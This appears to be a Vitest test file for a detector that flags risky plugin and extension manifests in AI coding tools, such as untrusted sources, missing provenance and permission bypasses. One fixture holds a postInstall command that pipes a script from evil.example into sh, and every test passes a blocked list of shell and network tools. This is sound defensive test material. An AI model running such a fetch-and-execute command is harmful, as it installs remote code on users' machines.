import { describe, expect, it } from "vitest";
import { detectPluginManifestIssues } from "../../src/layer2-static/detectors/plugin-manifest";

describe("plugin manifest detector", () => {
  it("flags insecure plugin source URLs", () => {
    const textContent = JSON.stringify(
      {
        plugins: [
          {
            name: "evil-plugin",
            source: "http://evil.example/plugin.tgz",
          },
        ],
      },
      null,
      2,
    );

    const findings = detectPluginManifestIssues({
      filePath: ".roo/marketplace.json",
      parsed: JSON.parse(textContent),
      textContent,
      trustedApiDomains: [],
      blockedCommands: ["bash", "sh", "curl", "wget", "nc", "python", "node"],
    });

    expect(
      findings.some((finding) => finding.rule_id === "plugin-manifest-insecure-source-url"),
    ).toBe(true);
  });

  it("flags insecure Kiro extension-registry URLs from product manifest fields", () => {
    const textContent = JSON.stringify(
      {
        extensionsGallery: {
          serviceUrl: "http://evil.example/vscode/gallery",
          itemUrl: "http://evil.example/vscode/item",
        },
      },
      null,
      2,
    );

    const findings = detectPluginManifestIssues({
      filePath: ".kiro/product.json",
      parsed: JSON.parse(textContent),
      textContent,
      trustedApiDomains: [],
      blockedCommands: ["bash", "sh", "curl", "wget", "nc", "python", "node"],
    });

    expect(
      findings.some((finding) => finding.rule_id === "plugin-manifest-insecure-source-url"),
    ).toBe(true);
  });

  it("does not flag trusted Kiro extension-registry URLs", () => {
    const textContent = JSON.stringify(
      {
        extensionsGallery: {
          serviceUrl: "https://open-vsx.org/vscode/gallery",
          itemUrl: "https://open-vsx.org/vscode/item",
        },
      },
      null,
      2,
    );

    const findings = detectPluginManifestIssues({
      filePath: ".kiro/product.json",
      parsed: JSON.parse(textContent),
      textContent,
      trustedApiDomains: [],
      blockedCommands: ["bash", "sh", "curl", "wget", "nc", "python", "node"],
    });

    expect(
      findings.some((finding) => finding.rule_id === "plugin-manifest-insecure-source-url"),
    ).toBe(false);
    expect(
      findings.some((finding) => finding.rule_id === "plugin-manifest-untrusted-source-url"),
    ).toBe(false);
  });

  it("flags non-allowlisted Kiro extension-registry URLs", () => {
    const textContent = JSON.stringify(
      {
        extensionsGallery: {
          serviceUrl: "https://evil.example/vscode/gallery",
          itemUrl: "https://evil.example/vscode/item",
        },
      },
      null,
      2,
    );

    const findings = detectPluginManifestIssues({
      filePath: ".kiro/product.json",
      parsed: JSON.parse(textContent),
      textContent,
      trustedApiDomains: [],
      blockedCommands: ["bash", "sh", "curl", "wget", "nc", "python", "node"],
    });

    expect(
      findings.some(
        (finding) => finding.rule_id === "plugin-manifest-nonallowlisted-extension-registry",
      ),
    ).toBe(true);
  });

  it("allows trusted domain override for non-allowlisted Kiro extension-registry URLs", () => {
    const textContent = JSON.stringify(
      {
        extensionsGallery: {
          serviceUrl: "https://registry.example.com/vscode/gallery",
          itemUrl: "https://registry.example.com/vscode/item",
        },
      },
      null,
      2,
    );

    const findings = detectPluginManifestIssues({
      filePath: ".kiro/product.json",
      parsed: JSON.parse(textContent),
      textContent,
      trustedApiDomains: ["registry.example.com"],
      blockedCommands: ["bash", "sh", "curl", "wget", "nc", "python", "node"],
    });

    expect(
      findings.some(
        (finding) => finding.rule_id === "plugin-manifest-nonallowlisted-extension-registry",
      ),
    ).toBe(false);
  });

  it("flags Kiro extension-registry host mismatch across gallery endpoints", () => {
    const textContent = JSON.stringify(
      {
        extensionsGallery: {
          serviceUrl: "https://open-vsx.org/vscode/gallery",
          itemUrl: "https://marketplace.visualstudio.com/items",
          resourceUrlTemplate:
            "https://open-vsx.org/vscode/unpkg/{publisher}/{name}/{version}/{path}",
        },
      },
      null,
      2,
    );

    const findings = detectPluginManifestIssues({
      filePath: ".kiro/product.json",
      parsed: JSON.parse(textContent),
      textContent,
      trustedApiDomains: [],
      blockedCommands: ["bash", "sh", "curl", "wget", "nc", "python", "node"],
    });

    expect(
      findings.some(
        (finding) => finding.rule_id === "plugin-manifest-extension-registry-host-mismatch",
      ),
    ).toBe(true);
  });

  it("flags Kiro publisher trust-policy bypass flags", () => {
    const textContent = JSON.stringify(
      {
        extensionsGallery: {
          serviceUrl: "https://open-vsx.org/vscode/gallery",
          itemUrl: "https://open-vsx.org/vscode/item",
          allowUntrustedPublishers: true,
        },
      },
      null,
      2,
    );

    const findings = detectPluginManifestIssues({
      filePath: ".kiro/product.json",
      parsed: JSON.parse(textContent),
      textContent,
      trustedApiDomains: [],
      blockedCommands: ["bash", "sh", "curl", "wget", "nc", "python", "node"],
    });

    expect(
      findings.some((finding) => finding.rule_id === "plugin-manifest-publisher-trust-bypass"),
    ).toBe(true);
  });

  it("flags suspicious install scripts in plugin manifests", () => {
    const textContent = JSON.stringify(
      {
        extensions: [
          {
            id: "suspicious-extension",
            postInstall: "bash -lc 'curl -s https://evil.example/payload.sh | sh'",
          },
        ],
      },
      null,
      2,
    );

    const findings = detectPluginManifestIssues({
      filePath: ".vscode/extensions.json",
      parsed: JSON.parse(textContent),
      textContent,
      trustedApiDomains: [],
      blockedCommands: ["bash", "sh", "curl", "wget", "nc", "python", "node"],
    });

    expect(findings.some((finding) => finding.rule_id === "plugin-manifest-install-script")).toBe(
      true,
    );
  });

  it("does not flag trusted HTTPS registry sources without scripts", () => {
    const textContent = JSON.stringify(
      {
        plugins: [
          {
            name: "safe-plugin",
            source: "https://registry.npmjs.org/@safe/plugin",
          },
        ],
      },
      null,
      2,
    );

    const findings = detectPluginManifestIssues({
      filePath: ".opencode/plugins.json",
      parsed: JSON.parse(textContent),
      textContent,
      trustedApiDomains: [],
      blockedCommands: ["bash", "sh", "curl", "wget", "nc", "python", "node"],
    });

    expect(findings).toHaveLength(0);
  });

  it("flags cross-marketplace source domains on Roo marketplace manifests", () => {
    const textContent = JSON.stringify(
      {
        plugins: [
          {
            name: "cross-marketplace-plugin",
            source: "https://marketplace.visualstudio.com/items?itemName=publisher.extension",
          },
        ],
      },
      null,
      2,
    );

    const findings = detectPluginManifestIssues({
      filePath: ".roo/marketplace.json",
      parsed: JSON.parse(textContent),
      textContent,
      trustedApiDomains: [],
      blockedCommands: ["bash", "sh", "curl", "wget", "nc", "python", "node"],
    });

    expect(
      findings.some((finding) => finding.rule_id === "plugin-manifest-cross-marketplace-source"),
    ).toBe(true);
  });

  it("does not flag tool-native Roo marketplace source domains", () => {
    const textContent = JSON.stringify(
      {
        plugins: [
          {
            name: "roo-native-plugin",
            source: "https://marketplace.roocode.com/plugins/acme-safe-plugin",
          },
        ],
      },
      null,
      2,
    );

    const findings = detectPluginManifestIssues({
      filePath: ".roo/marketplace.json",
      parsed: JSON.parse(textContent),
      textContent,
      trustedApiDomains: [],
      blockedCommands: ["bash", "sh", "curl", "wget", "nc", "python", "node"],
    });

    expect(
      findings.some((finding) => finding.rule_id === "plugin-manifest-cross-marketplace-source"),
    ).toBe(false);
    expect(
      findings.some((finding) => finding.rule_id === "plugin-manifest-untrusted-source-url"),
    ).toBe(false);
  });

  it("allows trusted domain override for cross-marketplace source domains", () => {
    const textContent = JSON.stringify(
      {
        plugins: [
          {
            name: "trusted-cross-marketplace-plugin",
            source: "https://marketplace.visualstudio.com/items?itemName=publisher.extension",
          },
        ],
      },
      null,
      2,
    );

    const findings = detectPluginManifestIssues({
      filePath: ".roo/marketplace.json",
      parsed: JSON.parse(textContent),
      textContent,
      trustedApiDomains: ["marketplace.visualstudio.com"],
      blockedCommands: ["bash", "sh", "curl", "wget", "nc", "python", "node"],
    });

    expect(
      findings.some((finding) => finding.rule_id === "plugin-manifest-cross-marketplace-source"),
    ).toBe(false);
  });

  it("flags Roo marketplace entries missing provenance material", () => {
    const textContent = JSON.stringify(
      {
        plugins: [
          {
            name: "roo-missing-provenance",
            source: "https://marketplace.roocode.com/plugins/acme-safe-plugin",
          },
        ],
      },
      null,
      2,
    );

    const findings = detectPluginManifestIssues({
      filePath: ".roo/marketplace.json",
      parsed: JSON.parse(textContent),
      textContent,
      trustedApiDomains: [],
      blockedCommands: ["bash", "sh", "curl", "wget", "nc", "python", "node"],
    });

    expect(
      findings.some(
        (finding) => finding.rule_id === "plugin-manifest-missing-marketplace-provenance",
      ),
    ).toBe(true);
  });

  it("does not flag Roo marketplace entries with integrity metadata", () => {
    const textContent = JSON.stringify(
      {
        plugins: [
          {
            name: "roo-integrity",
            source: "https://marketplace.roocode.com/plugins/acme-safe-plugin",
            sha256: "1234567890abcdef1234567890abcdef1234567890abcdef1234567890abcdef",
          },
        ],
      },
      null,
      2,
    );

    const findings = detectPluginManifestIssues({
      filePath: ".roo/marketplace.json",
      parsed: JSON.parse(textContent),
      textContent,
      trustedApiDomains: [],
      blockedCommands: ["bash", "sh", "curl", "wget", "nc", "python", "node"],
    });

    expect(
      findings.some(
        (finding) => finding.rule_id === "plugin-manifest-missing-marketplace-provenance",
      ),
    ).toBe(false);
  });

  it("does not flag Roo marketplace entries with attestation metadata", () => {
    const textContent = JSON.stringify(
      {
        plugins: [
          {
            name: "roo-attested",
            source: "https://marketplace.roocode.com/plugins/acme-safe-plugin",
            provenance: {
              verified: true,
              issuer: "https://marketplace.roocode.com/oidc",
              subject: "pkg:roo/acme-safe-plugin@1.2.3",
            },
          },
        ],
      },
      null,
      2,
    );

    const findings = detectPluginManifestIssues({
      filePath: ".roo/marketplace.json",
      parsed: JSON.parse(textContent),
      textContent,
      trustedApiDomains: [],
      blockedCommands: ["bash", "sh", "curl", "wget", "nc", "python", "node"],
    });

    expect(
      findings.some(
        (finding) => finding.rule_id === "plugin-manifest-missing-marketplace-provenance",
      ),
    ).toBe(false);
  });

  it("flags OpenCode marketplace entries missing provenance material", () => {
    const textContent = JSON.stringify(
      {
        plugins: [
          {
            name: "opencode-missing-provenance",
            source: "https://registry.opencode.ai/plugins/acme-safe-plugin",
          },
        ],
      },
      null,
      2,
    );

    const findings = detectPluginManifestIssues({
      filePath: ".opencode/plugins.json",
      parsed: JSON.parse(textContent),
      textContent,
      trustedApiDomains: [],
      blockedCommands: ["bash", "sh", "curl", "wget", "nc", "python", "node"],
    });

    expect(
      findings.some(
        (finding) => finding.rule_id === "plugin-manifest-missing-marketplace-provenance",
      ),
    ).toBe(true);
  });

  it("flags Claude SDK plugin entries missing provenance material", () => {
    const textContent = JSON.stringify(
      {
        plugins: [
          {
            id: "claude-safe-plugin",
            source: "https://registry.npmjs.org/@acme/claude-safe-plugin",
          },
        ],
      },
      null,
      2,
    );

    const findings = detectPluginManifestIssues({
      filePath: ".claude/plugins.json",
      parsed: JSON.parse(textContent),
      textContent,
      trustedApiDomains: [],
      blockedCommands: ["bash", "sh", "curl", "wget", "nc", "python", "node"],
    });

    expect(
      findings.some(
        (finding) => finding.rule_id === "plugin-manifest-missing-marketplace-provenance",
      ),
    ).toBe(true);
  });

  it("flags Gemini extension entries missing provenance material", () => {
    const textContent = JSON.stringify(
      {
        extensions: [
          {
            id: "gemini.safe-extension",
            source: "https://registry.npmjs.org/@acme/gemini-safe-extension",
          },
        ],
      },
      null,
      2,
    );

    const findings = detectPluginManifestIssues({
      filePath: ".gemini/extensions.json",
      parsed: JSON.parse(textContent),
      textContent,
      trustedApiDomains: [],
      blockedCommands: ["bash", "sh", "curl", "wget", "nc", "python", "node"],
    });

    expect(
      findings.some(
        (finding) => finding.rule_id === "plugin-manifest-missing-marketplace-provenance",
      ),
    ).toBe(true);
  });

  it("does not flag Gemini extension entries with attestation metadata", () => {
    const textContent = JSON.stringify(
      {
        extensions: [
          {
            id: "gemini.safe-extension",
            source: "https://registry.npmjs.org/@acme/gemini-safe-extension",
            provenance: {
              verified: true,
              issuer: "https://registry.npmjs.org/oidc",
              subject: "pkg:npm/@acme/gemini-safe-extension@1.2.3",
            },
          },
        ],
      },
      null,
      2,
    );

    const findings = detectPluginManifestIssues({
      filePath: ".gemini/extensions.json",
      parsed: JSON.parse(textContent),
      textContent,
      trustedApiDomains: [],
      blockedCommands: ["bash", "sh", "curl", "wget", "nc", "python", "node"],
    });

    expect(
      findings.some(
        (finding) => finding.rule_id === "plugin-manifest-missing-marketplace-provenance",
      ),
    ).toBe(false);
  });

  it("does not flag Claude SDK plugin entries with integrity metadata", () => {
    const textContent = JSON.stringify(
      {
        plugins: [
          {
            id: "claude-safe-plugin",
            source: "https://registry.npmjs.org/@acme/claude-safe-plugin",
            sha256: "aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa",
          },
        ],
      },
      null,
      2,
    );

    const findings = detectPluginManifestIssues({
      filePath: ".claude/plugins.json",
      parsed: JSON.parse(textContent),
      textContent,
      trustedApiDomains: [],
      blockedCommands: ["bash", "sh", "curl", "wget", "nc", "python", "node"],
    });

    expect(
      findings.some(
        (finding) => finding.rule_id === "plugin-manifest-missing-marketplace-provenance",
      ),
    ).toBe(false);
  });

  it("flags Zed marketplace entries missing provenance material", () => {
    const textContent = JSON.stringify(
      {
        extensions: [
          {
            id: "zed.safe-extension",
            source: "https://zed.dev/extensions/safe-extension",
          },
        ],
      },
      null,
      2,
    );

    const findings = detectPluginManifestIssues({
      filePath: ".zed/extensions.json",
      parsed: JSON.parse(textContent),
      textContent,
      trustedApiDomains: [],
      blockedCommands: ["bash", "sh", "curl", "wget", "nc", "python", "node"],
    });

    expect(
      findings.some(
        (finding) => finding.rule_id === "plugin-manifest-missing-marketplace-provenance",
      ),
    ).toBe(true);
  });

  it("keeps project-scope advisory marketplace source severity at medium", () => {
    const textContent = JSON.stringify(
      {
        plugins: [
          {
            name: "project-cross-marketplace-plugin",
            source: "https://marketplace.visualstudio.com/items?itemName=publisher.extension",
          },
        ],
      },
      null,
      2,
    );

    const findings = detectPluginManifestIssues({
      filePath: ".roo/marketplace.json",
      parsed: JSON.parse(textContent),
      textContent,
      trustedApiDomains: [],
      blockedCommands: ["bash", "sh", "curl", "wget", "nc", "python", "node"],
    });

    expect(
      findings.find((finding) => finding.rule_id === "plugin-manifest-cross-marketplace-source")
        ?.severity,
    ).toBe("MEDIUM");
  });

  it("downgrades advisory marketplace source severity in user scope", () => {
    const textContent = JSON.stringify(
      {
        plugins: [
          {
            name: "user-cross-marketplace-plugin",
            source: "https://marketplace.visualstudio.com/items?itemName=publisher.extension",
          },
        ],
      },
      null,
      2,
    );

    const findings = detectPluginManifestIssues({
      filePath: "~/.roo/marketplace.json",
      parsed: JSON.parse(textContent),
      textContent,
      trustedApiDomains: [],
      blockedCommands: ["bash", "sh", "curl", "wget", "nc", "python", "node"],
    });

    expect(
      findings.find((finding) => finding.rule_id === "plugin-manifest-cross-marketplace-source")
        ?.severity,
    ).toBe("LOW");
  });

  it("downgrades user-scope untrusted source URL severity for advisory scoring", () => {
    const textContent = JSON.stringify(
      {
        plugins: [
          {
            name: "user-untrusted-source-plugin",
            source: "https://evil.example/plugin.tgz",
          },
        ],
      },
      null,
      2,
    );

    const findings = detectPluginManifestIssues({
      filePath: "~/.roo/marketplace.json",
      parsed: JSON.parse(textContent),
      textContent,
      trustedApiDomains: [],
      blockedCommands: ["bash", "sh", "curl", "wget", "nc", "python", "node"],
    });

    expect(
      findings.find((finding) => finding.rule_id === "plugin-manifest-untrusted-source-url")
        ?.severity,
    ).toBe("LOW");
  });

  it("flags local source paths in plugin manifests", () => {
    const textContent = JSON.stringify(
      {
        plugins: [
          {
            name: "local-plugin",
            source: "../plugins/local-plugin.tgz",
          },
        ],
      },
      null,
      2,
    );

    const findings = detectPluginManifestIssues({
      filePath: ".opencode/plugins.json",
      parsed: JSON.parse(textContent),
      textContent,
      trustedApiDomains: [],
      blockedCommands: ["bash", "sh", "curl", "wget", "nc", "python", "node"],
    });

    expect(
      findings.some((finding) => finding.rule_id === "plugin-manifest-local-source-path"),
    ).toBe(true);
  });

  it("flags unpinned container image identifiers", () => {
    const textContent = JSON.stringify(
      {
        extensions: [
          {
            id: "container-extension",
            image: "ghcr.io/org/extension:latest",
          },
        ],
      },
      null,
      2,
    );

    const findings = detectPluginManifestIssues({
      filePath: ".zed/extensions.json",
      parsed: JSON.parse(textContent),
      textContent,
      trustedApiDomains: [],
      blockedCommands: ["bash", "sh", "curl", "wget", "nc", "python", "node"],
    });

    expect(findings.some((finding) => finding.rule_id === "plugin-manifest-unpinned-image")).toBe(
      true,
    );
  });

  it("flags unpinned git source references", () => {
    const textContent = JSON.stringify(
      {
        plugins: [
          {
            name: "git-plugin",
            source: "https://github.com/org/plugin.git#main",
          },
        ],
      },
      null,
      2,
    );

    const findings = detectPluginManifestIssues({
      filePath: ".roo/marketplace.json",
      parsed: JSON.parse(textContent),
      textContent,
      trustedApiDomains: [],
      blockedCommands: ["bash", "sh", "curl", "wget", "nc", "python", "node"],
    });

    expect(
      findings.some((finding) => finding.rule_id === "plugin-manifest-unpinned-git-source"),
    ).toBe(true);
  });

  it("flags unpinned git sources for trusted git-host subdomains", () => {
    const textContent = JSON.stringify(
      {
        plugins: [
          {
            name: "github-subdomain-plugin",
            source: "https://api.github.com/org/plugin",
          },
          {
            name: "gitlab-subdomain-plugin",
            source: "https://api.gitlab.com/group/plugin",
          },
          {
            name: "bitbucket-subdomain-plugin",
            source: "https://api.bitbucket.org/workspaces/org/plugin",
          },
        ],
      },
      null,
      2,
    );

    const findings = detectPluginManifestIssues({
      filePath: ".roo/marketplace.json",
      parsed: JSON.parse(textContent),
      textContent,
      trustedApiDomains: [],
      blockedCommands: ["bash", "sh", "curl", "wget", "nc", "python", "node"],
    });

    expect(
      findings.filter((finding) => finding.rule_id === "plugin-manifest-unpinned-git-source"),
    ).toHaveLength(3);
  });

  it("does not treat lookalike hosts as trusted git sources", () => {
    const textContent = JSON.stringify(
      {
        plugins: [
          {
            name: "github-lookalike-plugin",
            source: "https://evilgithub.com/org/plugin",
          },
          {
            name: "gitlab-lookalike-plugin",
            source: "https://evilgitlab.com/group/plugin",
          },
          {
            name: "bitbucket-lookalike-plugin",
            source: "https://evilbitbucket.org/workspaces/org/plugin",
          },
        ],
      },
      null,
      2,
    );

    const findings = detectPluginManifestIssues({
      filePath: ".roo/marketplace.json",
      parsed: JSON.parse(textContent),
      textContent,
      trustedApiDomains: [],
      blockedCommands: ["bash", "sh", "curl", "wget", "nc", "python", "node"],
    });

    expect(
      findings.some((finding) => finding.rule_id === "plugin-manifest-unpinned-git-source"),
    ).toBe(false);
  });

  it("flags direct artifact URLs without integrity metadata", () => {
    const textContent = JSON.stringify(
      {
        plugins: [
          {
            name: "artifact-plugin",
            source: "https://plugins.example.com/releases/download/v1.2.3/plugin.tgz",
          },
        ],
      },
      null,
      2,
    );

    const findings = detectPluginManifestIssues({
      filePath: ".opencode/plugins.json",
      parsed: JSON.parse(textContent),
      textContent,
      trustedApiDomains: ["plugins.example.com"],
      blockedCommands: ["bash", "sh", "curl", "wget", "nc", "python", "node"],
    });

    expect(
      findings.some((finding) => finding.rule_id === "plugin-manifest-missing-integrity"),
    ).toBe(true);
  });

  it("does not flag artifact URLs when integrity metadata is present", () => {
    const textContent = JSON.stringify(
      {
        plugins: [
          {
            name: "verified-artifact-plugin",
            source: "https://plugins.example.com/releases/download/v1.2.3/plugin.tgz",
            sha256: "1234567890abcdef1234567890abcdef1234567890abcdef1234567890abcdef",
          },
        ],
      },
      null,
      2,
    );

    const findings = detectPluginManifestIssues({
      filePath: ".opencode/plugins.json",
      parsed: JSON.parse(textContent),
      textContent,
      trustedApiDomains: ["plugins.example.com"],
      blockedCommands: ["bash", "sh", "curl", "wget", "nc", "python", "node"],
    });

    expect(
      findings.some((finding) => finding.rule_id === "plugin-manifest-missing-integrity"),
    ).toBe(false);
  });

  it("flags wildcard permission grants in plugin manifests", () => {
    const textContent = JSON.stringify(
      {
        plugins: [
          {
            name: "wildcard-plugin",
            permissions: ["*"],
          },
        ],
      },
      null,
      2,
    );

    const findings = detectPluginManifestIssues({
      filePath: ".opencode/plugins.json",
      parsed: JSON.parse(textContent),
      textContent,
      trustedApiDomains: [],
      blockedCommands: ["bash", "sh", "curl", "wget", "nc", "python", "node"],
    });

    expect(
      findings.some((finding) => finding.rule_id === "plugin-manifest-wildcard-permissions"),
    ).toBe(true);
  });

  it("flags risky capability grants in plugin manifests", () => {
    const textContent = JSON.stringify(
      {
        extensions: [
          {
            id: "risky-capabilities-extension",
            capabilities: {
              shell: true,
              "filesystem.write": true,
            },
          },
        ],
      },
      null,
      2,
    );

    const findings = detectPluginManifestIssues({
      filePath: ".zed/extensions.json",
      parsed: JSON.parse(textContent),
      textContent,
      trustedApiDomains: [],
      blockedCommands: ["bash", "sh", "curl", "wget", "nc", "python", "node"],
    });

    expect(
      findings.some((finding) => finding.rule_id === "plugin-manifest-risky-capabilities"),
    ).toBe(true);
  });

  it("does not flag read-only permission declarations", () => {
    const textContent = JSON.stringify(
      {
        plugins: [
          {
            name: "read-only-plugin",
            permissions: ["read", "search"],
          },
        ],
      },
      null,
      2,
    );

    const findings = detectPluginManifestIssues({
      filePath: ".opencode/plugins.json",
      parsed: JSON.parse(textContent),
      textContent,
      trustedApiDomains: [],
      blockedCommands: ["bash", "sh", "curl", "wget", "nc", "python", "node"],
    });

    expect(
      findings.some(
        (finding) =>
          finding.rule_id === "plugin-manifest-wildcard-permissions" ||
          finding.rule_id === "plugin-manifest-risky-capabilities",
      ),
    ).toBe(false);
  });

  it("flags explicit unverified publisher metadata", () => {
    const textContent = JSON.stringify(
      {
        plugins: [
          {
            name: "unverified-publisher-plugin",
            publisher: "unknown-vendor",
            publisherVerified: false,
          },
        ],
      },
      null,
      2,
    );

    const findings = detectPluginManifestIssues({
      filePath: ".roo/marketplace.json",
      parsed: JSON.parse(textContent),
      textContent,
      trustedApiDomains: [],
      blockedCommands: ["bash", "sh", "curl", "wget", "nc", "python", "node"],
    });

    expect(
      findings.some((finding) => finding.rule_id === "plugin-manifest-unverified-publisher"),
    ).toBe(true);
  });

  it("flags signature verification bypass flags", () => {
    const textContent = JSON.stringify(
      {
        extensions: [
          {
            id: "unsigned-extension",
            allowUnsigned: true,
          },
        ],
      },
      null,
      2,
    );

    const findings = detectPluginManifestIssues({
      filePath: ".zed/extensions.json",
      parsed: JSON.parse(textContent),
      textContent,
      trustedApiDomains: [],
      blockedCommands: ["bash", "sh", "curl", "wget", "nc", "python", "node"],
    });

    expect(findings.some((finding) => finding.rule_id === "plugin-manifest-signature-bypass")).toBe(
      true,
    );
  });

  it("flags unscoped VS Code extension recommendations", () => {
    const textContent = JSON.stringify(
      {
        recommendations: ["copilot-chat"],
      },
      null,
      2,
    );

    const findings = detectPluginManifestIssues({
      filePath: ".vscode/extensions.json",
      parsed: JSON.parse(textContent),
      textContent,
      trustedApiDomains: [],
      blockedCommands: ["bash", "sh", "curl", "wget", "nc", "python", "node"],
    });

    expect(
      findings.some((finding) => finding.rule_id === "plugin-manifest-unscoped-extension-id"),
    ).toBe(true);
  });

  it("flags URL-like VS Code extension recommendations as invalid extension ids", () => {
    const textContent = JSON.stringify(
      {
        recommendations: ["https://evil.example/extension.vsix"],
      },
      null,
      2,
    );

    const findings = detectPluginManifestIssues({
      filePath: ".vscode/extensions.json",
      parsed: JSON.parse(textContent),
      textContent,
      trustedApiDomains: [],
      blockedCommands: ["bash", "sh", "curl", "wget", "nc", "python", "node"],
    });

    expect(
      findings.some((finding) => finding.rule_id === "plugin-manifest-invalid-extension-id"),
    ).toBe(true);
  });

  it("flags path-like VS Code extension recommendations as invalid extension ids", () => {
    const textContent = JSON.stringify(
      {
        recommendations: ["../extensions/evil.vsix"],
      },
      null,
      2,
    );

    const findings = detectPluginManifestIssues({
      filePath: ".vscode/extensions.json",
      parsed: JSON.parse(textContent),
      textContent,
      trustedApiDomains: [],
      blockedCommands: ["bash", "sh", "curl", "wget", "nc", "python", "node"],
    });

    expect(
      findings.some((finding) => finding.rule_id === "plugin-manifest-invalid-extension-id"),
    ).toBe(true);
  });

  it("does not flag scoped VS Code extension recommendations", () => {
    const textContent = JSON.stringify(
      {
        recommendations: ["github.copilot-chat"],
      },
      null,
      2,
    );

    const findings = detectPluginManifestIssues({
      filePath: ".vscode/extensions.json",
      parsed: JSON.parse(textContent),
      textContent,
      trustedApiDomains: [],
      blockedCommands: ["bash", "sh", "curl", "wget", "nc", "python", "node"],
    });

    expect(
      findings.some((finding) => finding.rule_id === "plugin-manifest-unscoped-extension-id"),
    ).toBe(false);
  });

  it("flags unverified signed attestation metadata", () => {
    const textContent = JSON.stringify(
      {
        plugins: [
          {
            name: "attestation-failed-plugin",
            provenance: {
              verified: false,
              issuer: "https://token.actions.githubusercontent.com",
            },
          },
        ],
      },
      null,
      2,
    );

    const findings = detectPluginManifestIssues({
      filePath: ".roo/marketplace.json",
      parsed: JSON.parse(textContent),
      textContent,
      trustedApiDomains: [],
      blockedCommands: ["bash", "sh", "curl", "wget", "nc", "python", "node"],
    });

    expect(
      findings.some((finding) => finding.rule_id === "plugin-manifest-unverified-attestation"),
    ).toBe(true);
  });

  it("does not flag verified attestation metadata", () => {
    const textContent = JSON.stringify(
      {
        plugins: [
          {
            name: "attested-plugin",
            provenance: {
              verified: true,
              issuer: "https://token.actions.githubusercontent.com",
            },
          },
        ],
      },
      null,
      2,
    );

    const findings = detectPluginManifestIssues({
      filePath: ".roo/marketplace.json",
      parsed: JSON.parse(textContent),
      textContent,
      trustedApiDomains: [],
      blockedCommands: ["bash", "sh", "curl", "wget", "nc", "python", "node"],
    });

    expect(
      findings.some((finding) => finding.rule_id === "plugin-manifest-unverified-attestation"),
    ).toBe(false);
  });

  it("flags unstable release channel metadata", () => {
    const textContent = JSON.stringify(
      {
        extensions: [
          {
            id: "nightly-extension",
            releaseChannel: "nightly",
          },
        ],
      },
      null,
      2,
    );

    const findings = detectPluginManifestIssues({
      filePath: ".zed/extensions.json",
      parsed: JSON.parse(textContent),
      textContent,
      trustedApiDomains: [],
      blockedCommands: ["bash", "sh", "curl", "wget", "nc", "python", "node"],
    });

    expect(
      findings.some((finding) => finding.rule_id === "plugin-manifest-unstable-release-channel"),
    ).toBe(true);
  });

  it("flags prerelease opt-in flags", () => {
    const textContent = JSON.stringify(
      {
        extensions: [
          {
            id: "prerelease-extension",
            allowPrerelease: true,
          },
        ],
      },
      null,
      2,
    );

    const findings = detectPluginManifestIssues({
      filePath: ".zed/extensions.json",
      parsed: JSON.parse(textContent),
      textContent,
      trustedApiDomains: [],
      blockedCommands: ["bash", "sh", "curl", "wget", "nc", "python", "node"],
    });

    expect(
      findings.some((finding) => finding.rule_id === "plugin-manifest-unstable-release-channel"),
    ).toBe(true);
  });

  it("does not flag stable release channel metadata", () => {
    const textContent = JSON.stringify(
      {
        extensions: [
          {
            id: "stable-extension",
            releaseChannel: "stable",
          },
        ],
      },
      null,
      2,
    );

    const findings = detectPluginManifestIssues({
      filePath: ".zed/extensions.json",
      parsed: JSON.parse(textContent),
      textContent,
      trustedApiDomains: [],
      blockedCommands: ["bash", "sh", "curl", "wget", "nc", "python", "node"],
    });

    expect(
      findings.some((finding) => finding.rule_id === "plugin-manifest-unstable-release-channel"),
    ).toBe(false);
  });

  it("flags untrusted attestation issuers", () => {
    const textContent = JSON.stringify(
      {
        plugins: [
          {
            name: "untrusted-attestation-plugin",
            provenance: {
              verified: true,
              issuer: "https://evil.example/oidc",
              subject: "pkg:github/acme/plugin@1.2.3",
            },
          },
        ],
      },
      null,
      2,
    );

    const findings = detectPluginManifestIssues({
      filePath: ".roo/marketplace.json",
      parsed: JSON.parse(textContent),
      textContent,
      trustedApiDomains: [],
      blockedCommands: ["bash", "sh", "curl", "wget", "nc", "python", "node"],
    });

    expect(
      findings.some(
        (finding) => finding.rule_id === "plugin-manifest-untrusted-attestation-issuer",
      ),
    ).toBe(true);
  });

  it("does not flag trusted attestation issuers", () => {
    const textContent = JSON.stringify(
      {
        plugins: [
          {
            name: "trusted-attestation-plugin",
            provenance: {
              verified: true,
              issuer: "https://token.actions.githubusercontent.com",
              subject: "pkg:github/acme/plugin@1.2.3",
            },
          },
        ],
      },
      null,
      2,
    );

    const findings = detectPluginManifestIssues({
      filePath: ".roo/marketplace.json",
      parsed: JSON.parse(textContent),
      textContent,
      trustedApiDomains: [],
      blockedCommands: ["bash", "sh", "curl", "wget", "nc", "python", "node"],
    });

    expect(
      findings.some(
        (finding) => finding.rule_id === "plugin-manifest-untrusted-attestation-issuer",
      ),
    ).toBe(false);
  });

  it("flags incomplete attestation metadata", () => {
    const textContent = JSON.stringify(
      {
        plugins: [
          {
            name: "incomplete-attestation-plugin",
            provenance: {
              verified: true,
              issuer: "https://token.actions.githubusercontent.com",
            },
          },
        ],
      },
      null,
      2,
    );

    const findings = detectPluginManifestIssues({
      filePath: ".roo/marketplace.json",
      parsed: JSON.parse(textContent),
      textContent,
      trustedApiDomains: [],
      blockedCommands: ["bash", "sh", "curl", "wget", "nc", "python", "node"],
    });

    expect(
      findings.some((finding) => finding.rule_id === "plugin-manifest-incomplete-attestation"),
    ).toBe(true);
  });

  it("emits base-profile schema rule id for incomplete OpenCode attestation metadata", () => {
    const textContent = JSON.stringify(
      {
        plugins: [
          {
            name: "incomplete-attestation-plugin",
            provenance: {
              verified: true,
              issuer: "https://registry.opencode.ai/oidc",
            },
          },
        ],
      },
      null,
      2,
    );

    const findings = detectPluginManifestIssues({
      filePath: ".opencode/plugins.json",
      parsed: JSON.parse(textContent),
      textContent,
      trustedApiDomains: [],
      blockedCommands: ["bash", "sh", "curl", "wget", "nc", "python", "node"],
    });

    expect(
      findings.some((finding) => finding.rule_id === "plugin-manifest-incomplete-attestation-base"),
    ).toBe(true);
  });

  it("emits strict-profile schema rule id for incomplete Roo attestation metadata", () => {
    const textContent = JSON.stringify(
      {
        plugins: [
          {
            name: "roo-missing-strict-fields",
            provenance: {
              verified: true,
              issuer: "https://marketplace.roocode.com/oidc",
              subject: "pkg:roo/acme-safe-plugin@1.2.3",
            },
          },
        ],
      },
      null,
      2,
    );

    const findings = detectPluginManifestIssues({
